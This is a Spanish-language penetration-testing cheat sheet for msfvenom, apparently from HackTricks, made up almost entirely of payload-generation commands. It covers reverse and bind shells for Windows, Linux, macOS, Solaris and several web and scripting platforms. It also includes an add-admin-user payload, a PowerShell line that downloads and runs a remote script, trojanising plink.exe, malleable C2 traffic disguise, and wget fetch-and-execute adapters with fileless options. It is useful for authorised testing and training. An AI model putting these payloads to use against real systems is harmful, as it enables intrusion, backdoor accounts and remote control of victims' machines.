# MSFVenom - Hoja de trucos

{{#include ../../banners/hacktricks-training.md}}

---

## msfvenom básico

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Usa `-a` para seleccionar la arquitectura del payload y `--platform` para seleccionar su plataforma objetivo.<sup>[[1]](#references)</sup>

## Listado
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Estos comandos enumeran los módulos de payload y encoder disponibles en el framework instalado.<sup>[[1]](#references)</sup>

## Parámetros comunes al crear un shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Los flags mostrados aquí seleccionan los bad characters, el formato de salida, el encoder y las iteraciones de encoding.<sup>[[1]](#references)</sup>

## Configuración del tráfico de Meterpreter HTTP(S)

Metasploit 6.5 añadió la opción `MALLEABLEC2` a los payloads reverse HTTP(S) de Meterpreter staged y stageless. El perfil puede cambiar las URI, los user agents, las cabeceras de solicitud/respuesta, la ubicación del connection-ID y las codificaciones/wrappers de cuerpo compatibles. Tanto el payload generado como su handler deben cargar el **mismo perfil local**. La solicitud inicial de un payload staged para la etapa de Meterpreter no se configura, por lo que se recomienda un payload stageless como `windows/x64/meterpreter_reverse_https` cuando la primera solicitud también deba coincidir con el perfil.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Configura el matching handler con el mismo payload y profile:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Solo las directivas documentadas como implementadas afectan al tráfico; los bloques de perfil no compatibles pueden analizarse correctamente, pero no tener ningún efecto.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Crear usuario
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Ejecutar comando**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding no es evasión de AV:** los encoders como `x86/shikata_ga_nai` son principalmente útiles para satisfacer las restricciones de bad characters. La codificación repetida no es una técnica fiable de evasión de AV.<sup>[[1]](#references)</sup>

### Integrado dentro de un ejecutable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Cargas útiles de Linux

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payloads basados en Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads en lenguajes de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Los Fetch payloads producen un comando que hace que una utilidad disponible en el objetivo descargue y ejecute un native payload subyacente. Sus nombres siguen el formato `cmd/<platform>/<fetch-protocol>/<served-payload>`; hay adapters HTTP(S), SMB y TFTP disponibles, con opciones de downloader que dependen de la plataforma objetivo.<sup>[[2]](#references)</sup>

Por ejemplo, genera un comando `wget` de Linux que recupere un payload de Meterpreter x64 desde el puerto 8080 y se conecte de vuelta al puerto 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Inicia el **fetch handler** con la misma configuración; aloja el ELF generado y también inicia el handler para el payload Meterpreter servido:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Las opciones dependientes útiles incluyen `FETCH_PIPE=true` para emitir un comando HTTP(S) más corto cuando sea compatible, y `FETCH_FILELESS=shell`, `shell-search` o `python3.8+` para ejecutar un Linux ELF desde un descriptor de archivo anónimo. Los modos fileless requieren Linux kernel 3.17 o posterior; inspecciona el adapter exacto con `msfvenom -p <FETCH_PAYLOAD> --list-options`, ya que las combinaciones compatibles varían.<sup>[[2]](#references)</sup>



## References

- [1] [Cómo usar msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Cómo usar Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Perfiles C2 Malleable](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
